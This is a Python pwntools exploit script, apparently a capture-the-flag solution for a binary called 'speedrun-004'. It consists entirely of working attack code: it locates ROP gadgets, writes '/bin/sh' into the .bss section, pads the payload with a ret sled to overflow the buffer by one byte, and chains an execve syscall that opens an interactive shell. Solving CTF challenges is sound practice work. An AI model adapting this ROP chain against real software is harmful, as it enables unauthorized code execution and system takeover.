from pwn import *

context.arch = "amd64"
context.binary = "./speedrun-004"
elf = ELF("./speedrun-004")
target = process("./speedrun-004")
bss_addr = elf.bss()

# ROPgadget --binary ./speedrun-004 --only "pop|ret" | grep -E "rdi|rsi|rdx|rax"
pop_rdi = 0x400686
pop_rsi = 0x410A93
pop_rdx = 0x44A155
pop_rax = 0x415F04

# ROPgadget --binary ./speedrun-004 --only "syscall"
syscall = 0x40132C

ret = 0x400416

# ROPgadget --binary ./speedrun-004 --only "mov|ret"
# 0x0000000000418c37 : mov qword ptr [rdx], rax ; ret
write_gadget = 0x418C37

target_addr = bss_addr + 0x100

rop_chain = flat(
    pop_rdx,
    target_addr,
    pop_rax,
    b"/bin/sh\x00",
    write_gadget,
    pop_rdi,
    target_addr,
    pop_rsi,
    0,
    pop_rdx,
    0,
    pop_rax,
    0x3B,
    syscall,
)

ret_count = (256 - len(rop_chain)) // 8
payload = p64(ret) * ret_count + rop_chain

payload += b"\x00"

target.sendlineafter(b"?", b"257")
target.sendline(payload)
target.interactive()
